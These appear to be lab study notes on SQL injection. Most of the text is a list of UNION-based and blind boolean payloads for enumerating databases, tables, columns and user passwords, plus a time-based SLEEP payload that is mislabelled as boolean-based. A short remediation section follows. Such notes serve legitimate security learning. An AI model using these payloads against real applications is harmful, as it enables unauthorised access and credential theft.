# 📌 SQL Injection

## In-Band SQLi

// Discovery phase (Finding the number of columns).
`1 UNION SELECT 1`

// Discovery phase (Finding the number of columns).
`1 UNION SELECT 1,2`

// Discovery phase (Finding the number of columns).
`1 UNION SELECT 1,2,3`

// Nullifying the original result (Making space for the payload).
`0 UNION SELECT 1,2,3`

// Fingerprinting (Getting the database name).
`0 UNION SELECT 1,2,database()`

// Table Enumeration (Finding where the data is hidden).
`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`

// Column Enumeration (Finding the specific fields to steal).
`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`

## Blind SQLi - Boolean Based

`admin123' UNION SELECT 1;--`

`admin123' UNION SELECT 1,2,3;--`

`admin123' UNION SELECT 1,2,3 where database() like '%';--`

`admin123' UNION SELECT 1,2,3 where database() like 's%';--`

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`

`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`

`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id' and COLUMN_NAME !='username' and COLUMN_NAME !='password';`

`admin123' UNION SELECT 1,2,3 from users where username like 'a%`

`admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`

## Blind SQLi - Boolean Based

`admin123' UNION SELECT SLEEP(5);--`

## Remediation

**Remediation**

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:


**Prepared Statements (With Parameterized Queries):**

In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.


**Input Validation:**

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow.


**Escaping User Input:**

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.